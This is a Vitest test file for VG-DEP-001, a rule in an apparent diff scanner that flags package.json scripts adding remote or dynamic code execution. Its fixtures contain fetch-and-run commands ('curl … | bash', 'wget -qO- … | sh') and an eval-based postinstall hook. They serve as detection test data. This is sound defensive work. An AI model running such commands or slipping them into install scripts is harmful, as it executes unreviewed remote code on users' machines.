import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { parseUnifiedDiff, runRules } from '@vibeguard/core'
import { vgDep001 } from './index.js'

const __dirname = dirname(fileURLToPath(import.meta.url))

function readFixture(name: string): string {
  return readFileSync(join(__dirname, name), 'utf-8')
}

describe('VG-DEP-001', () => {
  const rules = [vgDep001]

  describe('trigger.diff', () => {
    it('produces a critical finding matching expected.json', () => {
      const diff = readFixture('trigger.diff')
      const expected = JSON.parse(readFixture('expected.json'))

      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(1)
      expect(findings[0]).toEqual(expected[0])
    })

    it('has the correct finding shape', () => {
      const diff = readFixture('trigger.diff')
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(1)

      const f = findings[0]
      expect(f.id).toBe('VG-DEP-001')
      expect(f.severity).toBe('critical')
      expect(f.file).toBe('package.json')
      expect(f.title).toBe('Package script added remote or dynamic code execution.')
      expect(f.evidence.length).toBeGreaterThan(0)
      expect(f.evidence[0]).toContain('curl')
      expect(f.evidence[0]).toContain('bash')
      expect(f.why).toBeTruthy()
      expect(f.review.length).toBeGreaterThan(0)
      expect(f.test.length).toBeGreaterThan(0)
    })
  })

  describe('non-trigger.diff', () => {
    it('produces zero findings', () => {
      const diff = readFixture('non-trigger.diff')
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(0)
    })
  })

  describe('edge cases', () => {
    it('detects wget | sh pattern', () => {
      const diff = `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -3,4 +3,5 @@
   "scripts": {
     "dev": "next dev",
+    "install-tool": "wget -qO- https://example.com/script.sh | sh",
     "build": "next build"
   }`
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(1)
      expect(findings[0].evidence[0]).toContain('wget')
    })

    it('detects eval() pattern', () => {
      const diff = `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -3,4 +3,5 @@
   "scripts": {
     "dev": "next dev",
+    "postinstall": "node -e eval(process.env.INIT_SCRIPT)",
     "build": "next build"
   }`
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(1)
      expect(findings[0].evidence[0]).toContain('eval(')
    })

    it('does not trigger on existing curl lines (not added)', () => {
      const diff = `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -3,5 +3,5 @@
   "scripts": {
-    "setup": "curl -s https://example.com/install.sh | bash",
+    "setup": "curl -s https://example.com/install-v2.sh | bash",
     "build": "next build"
   }`
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      // The added line also contains curl|bash, so it triggers
      expect(findings).toHaveLength(1)
    })

    it('does not trigger on safe npm install scripts', () => {
      const diff = `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -3,4 +3,5 @@
   "scripts": {
     "dev": "next dev",
+    "postinstall": "prisma generate",
     "build": "next build"
   }`
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(0)
    })

    it('does not match non-package.json files', () => {
      const diff = `diff --git a/Makefile b/Makefile
--- a/Makefile
+++ b/Makefile
@@ -1,3 +1,4 @@
 build:
+	curl -s https://example.com/install.sh | bash
 	go build`
      const files = parseUnifiedDiff(diff)
      const findings = runRules(files, rules)

      expect(findings).toHaveLength(0)
    })
  })
})
